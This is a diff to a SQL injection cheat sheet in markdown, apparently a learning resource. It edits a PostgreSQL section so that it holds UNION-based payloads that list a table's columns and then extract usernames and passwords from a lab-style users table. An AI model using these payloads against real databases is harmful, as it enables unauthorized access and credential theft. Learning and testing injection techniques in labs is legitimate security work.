@@ -196,11 +196,17 @@ MyDatabase     dbo           Users       Password     varchar
 
 ![image](https://github.com/th3knv/SQL_injection_cheatsheet/assets/76121926/5112fb40-80ba-4281-badf-31ab4289f463)
 
-- Going deeper (**for PostgreSQL**) we can explore the content of the table. Searching up a bit we will use an interesting table name called `pg_user`
+- Going deeper (**for PostgreSQL**) we can explore the content of the table. Searching up , we will find and use an interesting table name called `users_wvtyfp`
 ```sql
-' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name = 'pg_user'--
+' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name = 'users_wvtyfp'--
 ```
-![image](https://github.com/th3knv/SQL_injection_cheatsheet/assets/76121926/90ccbe5c-d806-4f31-b73f-c35de8f5a3d0)
+![image](https://github.com/th3knv/SQL_injection_cheatsheet/assets/76121926/5fc0da1b-0814-4e6f-879d-b0702be3cf72)
+
+Exploting this a bit more,
+```sql
+' UNION SELECT username_khsgkv, password_bzvrbj FROM users_wvtyfp--
+```
+![image](https://github.com/th3knv/SQL_injection_cheatsheet/assets/76121926/81ff21e1-defc-412d-b058-9f0a84a29965)
 
 #
 
